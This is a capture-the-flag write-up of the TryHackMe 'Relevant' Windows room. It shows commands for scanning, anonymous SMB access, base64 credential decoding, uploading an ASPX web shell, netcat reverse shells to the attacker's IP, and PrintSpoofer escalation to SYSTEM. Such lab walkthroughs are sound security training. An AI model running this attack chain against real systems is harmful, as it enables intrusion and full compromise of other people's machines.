# TryHackMe Relevant Write-up

<img width="1513" height="351" alt="image" src="https://github.com/user-attachments/assets/8b1fa4f2-7160-4008-8602-87abc7f22323" />

## Overview
Relevant is a Windows-based TryHackMe room that focuses on black-box enumeration, SMB misconfiguration, IIS exposure, and Windows privilege escalation.

## Target Information
- Target IP: 10.48.184.169
- Hostname: Relevant
- OS: Windows Server 2016
- Difficulty: Medium
- Goal: Get user.txt and root.txt

To make the target easier to reference during testing, I added the target IP address to my local /etc/hosts file and mapped it to `relevant.thm`.
```cmd id="dvo4ek"
sudo nano /etc/hosts
```
I added the following entry:

10.48.184.169        relevant.thm

### Start with Nmap Scan
```cmd id="dvo4ek"
nmap -p- --min-rate 5000 -T4 relevant.thm -oN allports.txt
```
<img width="1340" height="384" alt="image" src="https://github.com/user-attachments/assets/b3393f9f-0c6f-43a6-8c67-8e2300a4e6fc" />

```cmd id="dvo4ek"
nmap -sC -sV -p 80,135,1139,445,3389,49663,49666,49667 relevant.thm -oN detail.txt
```

<img width="1339" height="505" alt="image" src="https://github.com/user-attachments/assets/8c6172a5-94ce-473a-90a1-fb69da278a63" /> 

<img width="1382" height="855" alt="image" src="https://github.com/user-attachments/assets/e5a93114-9339-4d6c-9fe3-bc968d98a98a" />

Key ports discovered:

* 80 - IIS
* 445 - SMB
* 3389 - RDP
* 49663 - IIS web service

## SMB Enumeration

After identifying SMB running on port 445, I attempted anonymous share enumeration using `smbclient`. 

<img width="1338" height="279" alt="image" src="https://github.com/user-attachments/assets/6cdf0737-9792-4958-a94d-262f4e494818" />

The scan revealed several default administrative shares, as well as an unusual custom share named `nt4wrksv`.

The `-N` option allowed authentication without providing a password, which confirmed that anonymous access was permitted. Since `nt4wrksv` was not a default Windows share, I treated it as a high-priority target for further enumeration.

Inside the share, I discovered a file named `passwords.txt`, which later led to credential disclosure. This confirmed that the SMB service was misconfigured and exposed sensitive files to unauthenticated users.

## Credential Discovery

<img width="1338" height="404" alt="image" src="https://github.com/user-attachments/assets/84a01b3b-99bd-4406-80ca-c4235648cef0" />

Those are some encoded credentials. Decode them like this:
```cmd id="dvo4ek"
echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d
echo 'QmlsbCAtIEp1dzRubmFNNG40MjAhJCQk' | base64 -d
```
<img width="1339" height="165" alt="image" src="https://github.com/user-attachments/assets/5ef269ef-3d76-456c-bd33-a0b19e535d64" />

The `passwords.txt` file contained base64-encoded credentials for two users. After decoding the file, I attempted to validate whether the credentials could be reused against exposed services.

Since RDP was available on port `3389`, I tested the recovered credentials against the Remote Desktop service:
```cmd id="dvo4ek"
xfreerdp /u:<USER> /p:<PASSWORD> /v:relevant.thm
```
However, the credentials did not provide successful RDP access.

## Verifying SMB Write Access and Web Exposure

After that, I tested whether the share allowed file uploads. I created a simple test file on my Kali machine:

```cmd id="dvo4ek"
echo "test-from-kali" > test.txt
```
Then I connected to the SMB share anonymously and uploaded the file:
```cmd id="dvo4ek"
smbclient //relevant.thm/nt4wrksv -N
```
Inside the SMB session:
```cmd id="dvo4ek"
put test.txt
```

<img width="1339" height="358" alt="image" src="https://github.com/user-attachments/assets/ee0fe26b-7c1f-4df3-b21a-35c1552aa18e" />

The upload succeeded, confirming that the share was writable by an unauthenticated user.

Next, I checked whether the uploaded file was accessible through the IIS web service running on port 49663:
```cmd id="dvo4ek"
curl http://relevant.thm:49663/nt4wrksv/test.txt
```
The server returned the contents of the .txt file we created and uploaded earlier: `test-from-kali` 

<img width="1341" height="497" alt="image" src="https://github.com/user-attachments/assets/bb661da8-6a09-4ae9-b030-7942c02c5dd2" />
```text
49663 = web-accessible
80    = not mapped
```

This confirmed that the SMB share was not only writable, but also mapped to a web-accessible IIS directory. This was a critical finding because it meant that an attacker could upload a server-side script, such as an ASPX web shell, and execute it through the browser.

In other words, the test.txt file was used as a safe proof-of-concept to confirm the attack path before uploading a web shell.

## Initial Foothold

After confirming that files uploaded to the nt4wrksv SMB share were accessible through the IIS web service on port 49663, I moved from a harmless test file to a server-side ASPX web shell.

Since the target was running Microsoft IIS, an ASPX payload was appropriate. I copied the default ASPX command shell from Kali:
```cmd
cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx
```

<img width="1340" height="75" alt="image" src="https://github.com/user-attachments/assets/9f7d35c3-ae75-44b0-975a-b91d842cb134" />

Then I uploaded it to the writable SMB share:
```cmd id="dvo4ek"
smbclient //relevant/nt4wrksv -N
```
Inside the SMB session:
```cmd id="dvo4ek"
put shell.aspx
```
<img width="1340" height="472" alt="image" src="https://github.com/user-attachments/assets/6fb7c330-46dd-4867-a1c2-d7fc341d9b28" />

After the upload completed, I accessed the file through the web server:
```
http://relevant.thm:49663/nt4wrksv/shell.aspx
```

The ASPX page loaded successfully and provided a command execution form. To confirm remote code execution, I ran:
```cmd id="dvo4ek"
whoami
```
<img width="828" height="91" alt="image" src="https://github.com/user-attachments/assets/83b3a08c-bf27-468f-8ea6-8665cba60411" />

The command returned: `iis apppool\defaultapppool`

This confirmed that the uploaded ASPX file was being executed by IIS and that I had achieved remote command execution as the IIS application pool user.

Next, I checked the privileges assigned to this user:
```cmd id="dvo4ek"
whoami /priv
```
The important finding was that `SeImpersonatePrivilege` was `enabled`.

<img width="1012" height="291" alt="image" src="https://github.com/user-attachments/assets/e502e0c7-ed2d-412e-9c05-9dfe99239707" />

This was a key privilege escalation indicator. On Windows systems, service accounts such as IIS application pool users may have impersonation privileges. If abused, this privilege can allow an attacker to impersonate a more privileged token and potentially escalate to `NT AUTHORITY\SYSTEM`.

At this point, I noted `SeImpersonatePrivilege` as the likely privilege escalation path and prepared to obtain a more stable reverse shell before continuing exploitation.

### Getting a Reverse Shell

Although the ASPX web shell confirmed remote command execution, interacting through a browser-based command form was limited and inconvenient. To make post-exploitation easier, I uploaded `nc.exe` to the same writable SMB share and used it to obtain an interactive reverse shell.

First, I uploaded `nc.exe` from Kali to the `nt4wrksv` share:

```cmd id="dvo4ek"
smbclient //relevant.thm/nt4wrksv -N
```

Inside the SMB session:

```smb
put /usr/share/windows-resources/binaries/nc.exe nc.exe
```
I started a Netcat listener to catch the reverse shell. I used rlwrap for convenience, although a standard Netcat listener would also work.

```cmd id="dvo4ek"
rlwrap -cAr nc -lvnp 4444
```
<img width="955" height="120" alt="image" src="https://github.com/user-attachments/assets/e6202c6e-01b3-4b41-9c2a-04a32754b395" />

Then, from the ASPX web shell, I executed `nc.exe` to connect back to my listener:

```cmd id="dvo4ek"
C:\inetpub\wwwroot\nt4wrksv\nc.exe -e cmd.exe <YOUR-VPN-IP> 4444
```
<img width="1338" height="358" alt="image" src="https://github.com/user-attachments/assets/4feeed05-6737-4e71-a964-60adad81fb78" />

After running the command, I received a reverse shell on my Kali machine. I confirmed the current user context again:

```cmd id="dvo4ek"
whoami
```
<img width="1338" height="240" alt="image" src="https://github.com/user-attachments/assets/3dddb9a3-58e5-4608-9fed-e97cf22b98c4" />

The shell was running as:

```text
iis apppool\defaultapppool
```

This provided a more stable command-line shell for further enumeration and privilege escalation.

### User Flag

With the reverse shell established, I enumerated the user directories:

```cmd id="dvo4ek"
dir C:\Users
```
<img width="1335" height="109" alt="image" src="https://github.com/user-attachments/assets/7a9a29c9-739c-4d78-ab5e-a76b961f6159" />

The `Bob` user directory was present, so I checked the Desktop folder:

The `user.txt` file was found on Bob’s Desktop. I read the flag using the full path:

```cmd id="dvo4ek"
type C:\Users\Bob\Desktop\user.txt
```
<img width="1335" height="109" alt="image" src="https://github.com/user-attachments/assets/a5128172-d927-4019-95bc-db606669e57f" />

This completed the initial compromise stage and confirmed access to the user-level flag.

### Privilege Escalation with PrintSpoofer

During privilege enumeration, the `whoami /priv` output showed that `SeImpersonatePrivilege` was enabled for the current IIS application pool user:

```cmd id="9xyrp7"
whoami /priv
```

Important output:

```text id="cj1k07"
SeImpersonatePrivilege    Enabled
```

This privilege was important because Windows service accounts often require impersonation privileges for normal operations. However, if an attacker gains code execution as one of these service accounts, this privilege can sometimes be abused to impersonate a higher-privileged token and escalate to `NT AUTHORITY\SYSTEM`.

`PrintSpoofer.exe` was not available on Kali by default, so I obtained a compiled release of the publicly available PrintSpoofer tool and transferred it to the target through the writable SMB share.

This step was performed after confirming that the current user had `SeImpersonatePrivilege` enabled, making token impersonation a likely privilege escalation path.

Since the target was Windows Server 2016 64-bit, using the 64-bit version makes sense. 

I uploaded `PrintSpoofer64.exe` to the writable SMB share:

```bash
smbclient //relevant.thm/nt4wrksv -N
```

Inside the SMB session:

```smb id="5e8kvv"
put PrintSpoofer64.exe
```
<img width="1327" height="243" alt="image" src="https://github.com/user-attachments/assets/158566d6-d3db-49e5-8a51-179ad9ebba77" />

Since the SMB share was mapped to the IIS web directory, the file was available on the target at:

```cmd id="t5btff"
C:\inetpub\wwwroot\nt4wrksv\PrintSpoofer64.exe
```

On my Kali machine, I started another Netcat listener to catch a SYSTEM shell:

```bash id="yuiigo"
rlwrap -cAr nc -lvnp 5555
```
<img width="1344" height="73" alt="image" src="https://github.com/user-attachments/assets/566957fd-a6b4-492f-8df6-6e09f87024fe" />

Then, from the existing reverse shell, I executed PrintSpoofer and used it to run `nc.exe` as SYSTEM:

```cmd id="kjskg7"
C:\inetpub\wwwroot\nt4wrksv\PrintSpoofer64.exe -c "C:\inetpub\wwwroot\nt4wrksv\nc.exe -e cmd.exe <YOUR-VPN-IP> 5555"
```
<img width="1352" height="507" alt="image" src="https://github.com/user-attachments/assets/ad15ee47-4f1d-43e6-b3ca-ebd136cbe681" />

After running the command, I received a new reverse shell on my listener. I confirmed the privilege escalation by running:

```cmd id="dvo4ek"
whoami
```
<img width="1344" height="244" alt="image" src="https://github.com/user-attachments/assets/2c374646-35af-4fa9-b237-df33d74541be" />

The output showed:

```text id="1kwp42"
nt authority\system
```
With SYSTEM-level access confirmed, I navigated to the Administrator Desktop directory:
```cmd id="dvo4ek"
dir C:\Users\Administrator\Desktop
```
The root.txt file was present in the Administrator Desktop folder. I then read the flag using:
```cmd id="dvo4ek"
type C:\Users\Administrator\Desktop\root.txt
```
This confirmed successful privilege escalation from the IIS application pool user to SYSTEM.

## Attack Chain Summary

The final attack chain was:

```text
Full port scan
→ Discovered SMB and IIS on port 49663
→ Found anonymous SMB share: nt4wrksv
→ Confirmed the share was writable
→ Confirmed uploaded files were accessible through IIS
→ Uploaded ASPX web shell
→ Gained command execution as iis apppool\defaultapppool
→ Uploaded nc.exe and obtained a reverse shell
→ Found user.txt on Bob’s Desktop
→ Identified SeImpersonatePrivilege
→ Used PrintSpoofer64.exe to escalate to NT AUTHORITY\SYSTEM
→ Retrieved root.txt from Administrator’s Desktop
```

## What I Learned

This room reinforced the importance of full port scanning. The default IIS page on port `80` did not reveal much, but the additional IIS service on port `49663` became important later in the attack path.

I also learned how dangerous an anonymously accessible and writable SMB share can be, especially when it is mapped to a web-accessible directory. In this case, a simple file upload through SMB became remote code execution through IIS.

Another key lesson was the importance of checking Windows privileges after gaining a shell. The `whoami /priv` output revealed `SeImpersonatePrivilege`, which became the privilege escalation path to SYSTEM.

Overall, this room was a good example of how multiple small misconfigurations can be chained together to fully compromise a Windows machine.

